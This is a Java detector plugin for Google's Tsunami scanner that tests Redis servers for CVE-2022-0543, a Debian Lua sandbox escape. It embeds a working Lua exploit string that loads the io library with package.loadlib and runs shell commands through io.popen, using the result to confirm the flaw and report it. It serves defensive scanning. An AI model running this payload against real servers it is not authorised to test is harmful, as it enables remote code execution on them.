/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.exceptions.JedisException;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for Redis CVE-2022-0543. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Redis CVE-2022-0543 Detector",
    version = "0.1",
    description = "VulnDetector for Redis CVE-2022-0543",
    author = "shpei1963 (shpei1963@outlook.com)",
    bootstrapModule = Cve20220543DetectorBootstrapModule.class)
public final class Cve20220543Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String EXPLOIT_SCRIPT = "local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"%s\", \"r\"); local res = f:read(\"*a\"); f:close(); return res";

  @VisibleForTesting
  static final String TITLE = "Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)";
  @VisibleForTesting
  static final String DESCRIPTION = "Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. Due to a packaging issue, Redis is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.";
  @VisibleForTesting
  static final String RECOMMENDATION = "Upgrade Redis to a fixed version based on https://security-tracker.debian.org/tracker/CVE-2022-0543";

  private final Clock utcClock;
  private final JedisPoolFactory jedisPoolFactory;
  private final PayloadGenerator payloadGenerator;
  @Inject
  Cve20220543Detector(
      @UtcClock Clock utcClock, JedisPoolFactory jedisPoolFactory, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.jedisPoolFactory = jedisPoolFactory;
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve20220543Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isRedisService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isRedisService(NetworkService networkService) {
    return networkService.getServiceName().equals("redis");
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = this.payloadGenerator.generate(config);
    String script = String.format(EXPLOIT_SCRIPT, payload.getPayload());
    try (
        JedisPool jedisPool = jedisPoolFactory.create(networkService.getNetworkEndpoint());
        Jedis jedis = jedisPool.getResource()
    ) {
      return payload.checkIfExecuted((String) jedis.eval(script));
    } catch (JedisException e) {
      logger.atInfo().withCause(e).log("Jedis error, target is not vulnerable");
      return false;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Cannot execute exploit.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2022_0543"))
                .setSeverity(Severity.CRITICAL)
                .setTitle(TITLE)
                .setDescription(DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
